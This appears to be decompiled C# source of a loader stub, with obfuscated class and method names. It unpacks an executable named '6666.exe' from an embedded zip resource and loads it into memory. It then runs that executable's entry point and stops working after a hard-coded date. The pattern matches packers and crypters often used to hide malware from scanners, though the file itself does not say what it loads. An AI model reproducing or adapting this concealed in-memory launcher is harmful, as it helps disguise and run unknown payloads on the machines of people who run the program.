using System;
using System.IO;
using System.IO.Packaging;
using System.Reflection;
using System.Windows.Forms;

namespace R;

internal static class spkgotqttt
{
	private static Assembly hjghuvrioc(Package bhprusuusq, string xrbwovnioe)
	{
		Uri uri = new Uri(xrbwovnioe, UriKind.Relative);
		byte[] array;
		using (Stream stream = bhprusuusq.GetPart(uri).GetStream())
		{
			array = new byte[(int)stream.Length];
			stream.Read(array, 0, array.Length);
		}
		Assembly assembly = Assembly.Load(array);
		if ((object)assembly == null)
		{
			throw new ArgumentException("Unable to load assembly: " + xrbwovnioe);
		}
		return assembly;
	}

	[STAThread]
	private static void mmxxtxoxkn(string[] args)
	{
		//IL_00ca: Unknown result type (might be due to invalid IL or missing references)
		if (DateTime.Now > new DateTime(635305274121846345L))
		{
			throw new Exception();
		}
		try
		{
			using Stream stream = typeof(spkgotqttt).Assembly.GetManifestResourceStream("a.zip");
			Package val = Package.Open(stream, FileMode.Open, FileAccess.Read);
			try
			{
				Assembly assembly = hjghuvrioc(val, "/6666.exe");
				assembly.EntryPoint!.Invoke(null, new object[1] { args });
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.GetType().Name + "\n" + ex.Message + "\n" + ex.StackTrace);
		}
	}
}
